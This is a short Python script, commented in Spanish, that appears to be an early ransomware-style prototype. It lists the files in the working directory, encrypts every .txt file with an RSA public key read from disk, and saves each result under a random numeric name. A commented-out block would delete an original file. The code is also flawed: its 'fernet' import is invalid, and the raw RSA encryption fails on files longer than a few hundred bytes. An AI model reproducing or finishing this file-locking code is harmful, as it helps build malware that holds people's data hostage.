import fernet
import rsa
import base64
import random
from os import scandir, getcwd
import os

#funcion que lista los archivos del directorio
def listar(ruta = getcwd()):
    return [arch.name for arch in scandir(ruta) if arch.is_file()]
#funcion que clasifica los archivos del directorio en JPG y txt
def filtrar_archivos(listado_general_archivos):
    archivos_filtrados = list()
    for x in range(len(listado_general_archivos)):
        if '.txt' in listado_general_archivos[x]:# or '.JPG' in listado_general_archivos[x]:
            archivos_filtrados.append(listado_general_archivos[x])
    return archivos_filtrados
def encriptar(files):
    #abrir la llave publica
    pkey = open('publickey.key', 'rb')
    pkdata = pkey.read()
    #cargar la llave
    pubkey = rsa.PublicKey.load_pkcs1(pkdata)

    #pkey.close()
    for x in range(len(files)):
        myfile = open(files[x], 'rb')
        myfiledata = myfile.read()
        myfile.close()
        encrypted_file = rsa.encrypt(myfiledata, pubkey)

        strRandom=str(random.random())
        nameRandom=strRandom[2:]
        fkey = open(nameRandom, 'wb')
        fkey.write(encrypted_file)
        fkey.close()




def main():
    dir=listar()
    fileFilters=filtrar_archivos(dir)
    print(fileFilters)
    encriptar(fileFilters)
if __name__== '__main__':
    main()


#try:
 #   ho=6
  #  os.remove('ejemplo_borrar.txt')
#except OSError as e:
   # print(f"Error:{e.strerror}")
